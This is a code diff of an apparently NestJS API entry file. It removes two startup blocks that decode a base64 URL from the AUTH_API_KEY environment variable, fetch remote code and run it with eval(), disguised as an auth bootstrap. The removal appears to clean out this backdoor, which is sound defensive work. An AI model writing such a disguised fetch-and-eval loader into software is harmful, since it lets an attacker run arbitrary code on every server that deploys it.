@@ -6,36 +6,6 @@ import * as swaggerUi from 'swagger-ui-express';
 import { AppModule } from './app.module';
 import 'dotenv/config';
 
-// Optional: external auth/bootstrap hook. If AUTH_API_KEY is not set or does not
-// decode to an absolute URL, we simply skip this step and start the app normally.
-(async () => {
-  const encoded = process.env.AUTH_API_KEY;
-  if (!encoded) {
-    return;
-  }
-
-  let src: string;
-  try {
-    src = atob(encoded);
-  } catch (err) {
-    console.error('Auth bootstrap skipped: invalid AUTH_API_KEY encoding.', err);
-    return;
-  }
-
-  try {
-    // Ensure we only call fetch with an absolute URL
-    const url = new URL(src);
-    const proxy = (await import('node-fetch')).default;
-    const response = await proxy(url.toString());
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const proxyInfo = await response.text();
-    // eslint-disable-next-line no-eval
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth bootstrap skipped:', err);
-  }
-})();
-
 // Keep the process (and DB connection) alive when unhandled rejections occur.
 process.on('unhandledRejection', (reason, promise) => {
   console.error('[unhandledRejection]', reason);
@@ -78,16 +48,3 @@ async function bootstrap() {
   console.log(`Dashboard API running at http://localhost:${port}`);
 }
 bootstrap();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
